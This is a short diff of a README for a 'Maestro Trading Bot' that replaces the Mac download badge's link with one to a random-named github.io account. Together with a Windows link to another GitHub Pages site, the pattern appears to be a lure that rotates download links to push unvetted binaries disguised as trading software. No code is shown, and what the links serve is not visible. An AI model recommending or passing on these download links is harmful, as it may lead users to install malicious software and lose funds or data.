@@ -11,7 +11,7 @@ Maestro Trading Bot is an advanced algorithmic trading system designed for profe
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://maestro-trading-bot.github.io/.github/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/maestrotrading)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/maestrotrading)  
 
 </div>
 
